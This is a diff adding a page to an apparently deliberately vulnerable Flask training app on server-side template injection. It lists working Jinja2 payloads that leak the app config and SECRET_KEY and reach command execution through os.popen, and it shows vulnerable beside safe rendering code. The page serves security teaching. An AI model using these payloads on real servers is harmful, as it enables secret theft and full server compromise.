@@ -1,0 +1,66 @@
+{% extends "base.html" %}
+{% block title %}SSTI{% endblock %}
+{% block content %}
+<h1 class="page-title">SSTI — Server-Side Template Injection</h1>
+<p class="page-subtitle">A03:2021 · User input rendered as Jinja2 template → config leak → RCE</p>
+<div class="mode-banner {{ 'safe' if safe else 'vuln' }}">
+  <span class="badge">{{ 'SAFE MODE' if safe else 'VULNERABLE' }}</span>
+  {% if safe %}Input escaped before output — template syntax treated as plain text.{% else %}Input passed directly to render_template_string() — Jinja2 executes it.{% endif %}
+  <button onclick="toggleSafe()" class="btn {{ 'btn-red' if safe else 'btn-green' }}" style="margin-left:auto;font-size:11px;padding:0.3rem 0.8rem;">Switch to {{ 'Vulnerable' if safe else 'Safe' }} Mode</button>
+</div>
+<div class="split">
+  <div>
+    <div class="card">
+      <div class="card-header"><span>🔥</span><span class="card-title">Greeting Page</span></div>
+      <form method="GET" action="/ssti">
+        <input name="safe" type="hidden" value="{{ '1' if safe else '0' }}">
+        <div style="display:flex;gap:0.75rem;">
+          <input name="name" class="form-input" placeholder="Your name" value="{{ name | e }}">
+          <button type="submit" class="btn btn-green">Greet</button>
+        </div>
+      </form>
+      {% if result %}
+      <div style="margin-top:1rem;padding:1rem;background:#010409;border:1px solid {% if '49' in result or 'config' in result or 'class' in result %}var(--red){% else %}var(--green){% endif %};border-radius:6px;font-size:14px;">
+        {{ result }}
+      </div>
+      {% endif %}
+      {% if error %}<div class="alert alert-danger">{{ error }}</div>{% endif %}
+    </div>
+    <div class="card">
+      <div class="card-header"><span>⚡</span><span class="card-title">Payloads to Try</span></div>
+      {% set payloads = [
+        ("{{7*7}}", "Expression eval — if output is 49, SSTI confirmed"),
+        ("{{config}}", "Dump Flask app config — exposes SECRET_KEY"),
+        ("{{config.items()}}", "Full config as key-value pairs"),
+        ("{{request.environ}}", "Server environment — paths, versions"),
+        ("{{''.__class__.__mro__}}", "Python MRO — first step to RCE"),
+        ("{{lipsum.__globals__['os'].popen('id').read()}}", "RCE — reads output of 'id' command"),
+      ] %}
+      {% for payload, desc in payloads %}
+      <a href="/ssti?safe=0&name={{ payload | urlencode }}" style="display:block;background:#010409;border:1px solid var(--border);border-radius:5px;padding:0.5rem 0.75rem;margin-bottom:0.4rem;text-decoration:none;" onmouseover="this.style.borderColor='var(--red)'" onmouseout="this.style.borderColor='var(--border)'">
+        <code style="font-size:11px;color:var(--red);">{{ payload | e }}</code>
+        <div style="font-size:10px;color:var(--gray);margin-top:3px;">{{ desc }}</div>
+      </a>
+      {% endfor %}
+    </div>
+  </div>
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💡</span><span class="card-title">Vulnerable vs Safe Code</span></div>
+      <div class="code-block" style="font-size:11px;">❌ VULNERABLE:
+from flask import render_template_string
+name = request.args.get('name')
+result = render_template_string(f"Hello, {name}!")
+# User input directly in template string → SSTI
+
+✅ SAFE:
+name = html.escape(request.args.get('name',''))
+result = f"Hello, {name}!"
+# OR use render_template with variable:
+return render_template('greet.html', name=name)
+# Jinja2 auto-escapes {{ name }} in templates</div>
+      <div class="alert alert-warn" style="margin-top:1rem;"><strong>Impact:</strong> SSTI in Jinja2 always leads to RCE. The Python object hierarchy is accessible — attacker reaches os.popen() through MRO traversal. Full server compromise.</div>
+    </div>
+  </div>
+</div>
+{% endblock %}
